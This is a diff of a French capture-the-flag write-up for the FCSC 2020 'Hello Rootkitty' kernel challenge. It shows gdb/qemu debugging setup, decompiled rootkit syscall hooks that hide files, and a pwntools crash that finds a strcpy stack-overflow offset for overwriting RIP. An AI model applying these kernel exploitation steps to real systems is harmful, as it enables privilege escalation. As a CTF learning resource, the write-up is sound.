@@ -1,22 +1,37 @@
 # Hello Rootkitty 
 
-## intitulé
+## Intitulé
 
 > Une machine a été infectée par le rootkit Hello Rootkitty qui empêche la lecture de certains fichiers.
 > Votre mission : aider la victime à récupérer le contenu des fichiers affectés. Une fois connecté en SSH, lancez le wrapper pour démarrer le challenge.
 
 ## Fichiers fournis
-[bzImage](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/bzImage) le kernel linux
-[ecsc.ko](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/ecsc.ko) le rootkit sous forme de module kernel 
-[initramfs.example.cpio](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/initramfs.example.cpio) Le système de fichier
+* [bzImage](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/bzImage) le kernel linux
+* [ecsc.ko](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/ecsc.ko) le rootkit sous forme de module kernel 
+* [initramfs.example.cpio](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/initramfs.example.cpio) Le système de fichier
 
-Au vu des fichiers, on peut s'imaginer qu'on va devoir exploiter une vulnérabilité kernel.
+## Debuggage
+Au vu des fichiers, on peut s'imaginer qu'on va devoir exploiter une vulnérabilité kernel. Ces derniers permetent de lancer le challenge en local et de le debuguer avec gdb.
+Pour cela, il faut extraire le fichier bzImage avec [ce script](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) réalisé par Linus Torvalds himself.
+```bash
+bash extract-vmlinux > vmlinux
+gdb vmlinux
+```
+
+On lance le challenge avec [le script de démarrage qemu](start.sh) (fourni dans la vm, je l'ai modifié un peu). Dans la vm, on tape :
+```bash
+/ $ cat /sys/module/ecsc/sections/.text
+0xffffffffc03ba000
+```
+Puis dans gdb : `add-symbol-file ecsc.ko 0xffffffffc03ba000`, on peut alors placer des breakpoints sur les fonctions du module. Puis on attache le debugguer à l'instance qemu : `target remote localhost:3456` (le port 3456 est définit dans le script de démarrage mentionné plus haut)
+Et voilà.
+
 
 ## Analyse
 Après avoir lancé le wrapper mentionné dans l'intitulé, on se rend compte que les fichiers commençants par "ecsc_flag_" ont un comportement étrange : on ne peut pas visualiser leur contenu et ils sont renommés automatiquement :
 ```bash
 ~ $ echo "test" > ecsc_flag_1234
-~ $ ls -al~~~~
+~ $ ls -al
 total 0
 drwxrwxrwx    2 ctf      ctf              0 May  4 19:44 .
 drwxr-xr-x    3 root     root             0 Feb 25 09:30 ..
@@ -25,7 +40,7 @@ drwxr-xr-x    3 root     root             0 Feb 25 09:30 ..
 cat: can't open 'ecsc_flag_XXXX': No such file or direc****tory
 ```
 
-à noter qu'ils changent de propriétaire et de date.
+À noter qu'ils changent de propriétaire et de date.
 
 En décompilant le module avec [ghidra](https://ghidra-sre.org/)  on comprend un peu mieux ce qu'il se passe :
 Les syscalls **lstat**, **getdents**, **getdents64** sont *hookés* :
@@ -49,10 +64,10 @@ long init_module(void)
 }
 ```
 
-le syscall [lstat](https://linux.die.net/man/2/lstat)  permet normalement d'afficher les attributs d'un fichier.
-les syscalls [getdents](https://linux.die.net/man/2/getdents) et [getdents64](https://linux.die.net/man/2/getdents) permettent d'afficher le nom des fichiers.
+Le syscall [lstat](https://linux.die.net/man/2/lstat)  permet normalement d'afficher les attributs d'un fichier.
+Les syscalls [getdents](https://linux.die.net/man/2/getdents) et [getdents64](https://linux.die.net/man/2/getdents) permettent d'afficher le nom des fichiers.
 
-Tout s'explique. On va donc étudier de plus près les hooks de ces syscalls, plus particulièrement celui des syscall **getdents** et **getdents64**. Voilà ce que donne la fonction ecsc_sys_getdents64 :
+Tout s'explique. On va donc étudier de plus près les hooks de ces syscalls, plus particulièrement celui des syscalls **getdents** et **getdents64**. Voilà ce que donne la fonction **ecsc_sys_getdents64** :
 ```c
 ulong ecsc_sys_getdents64(ulong fd,dirent *dirp,ulong count)
 
@@ -152,11 +167,11 @@ ulong ecsc_sys_getdents64(ulong fd,dirent *dirp,ulong count)
 ```
 
 Sans s'attarder sur les détails on voit que :
-1. le syscall original est appelé,
-2. si le fichier débute par "ecsc_flag_", la suite du nom de fichier est remplacé par de "X"
-3. la fonction fait des appels à **strcpy**, ce qui est très dangereux et peut provoquer des buffers overflow. D'une manière générale, on ne fait jamais appel à ces fonctions dans le kernel et les modules, en pivilegiant plutôt les fonctions comme [copy_from_user](https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-from-user.html) par exemple.
+1. Le syscall original est appelé afin de récuperer les informations réelles du fichier,
+2. Si le fichier débute par "ecsc_flag_", la suite du nom de fichier est remplacé par de "X"
+3. La fonction fait des appels à **strcpy**, ce qui est très dangereux et peut provoquer des buffers overflow. D'une manière générale, on ne fait jamais appel à cette fonction, surtout dans le kernel et les modules, en privilegiant plutôt les fonctions comme [copy_from_user](https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-from-user.html) par exemple.
 
-Afin de tester la vulnérabilité et de connaitre l'offset pour lequel on overwrite la rip, nous allons faire appel à pwn tools :
+Afin de tester la vulnérabilité et de connaitre l'offset pour lequel on overwrite la rip, nous allons faire appel à [pwn tools](https://docs.pwntools.com/en/stable/) :
 ```python
 Python 2.7.17 (default, Apr 15 2020, 17:20:14) 
 [GCC 7.5.0] on linux2
@@ -197,7 +212,7 @@ Kernel panic - not syncing: Fatal exception
 Kernel Offset: 0x37e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
 Rebooting in 1 seconds..
 ```
-Bingo ! pwntools nous donne l'offset en question (Notez la valeur de RIP) :
+Bingo ! pwntools nous donne l'offset en question (notez la valeur de RIP) :
 ```python
 >>> cyclic_find(p64(0x6163626161626261))
 102
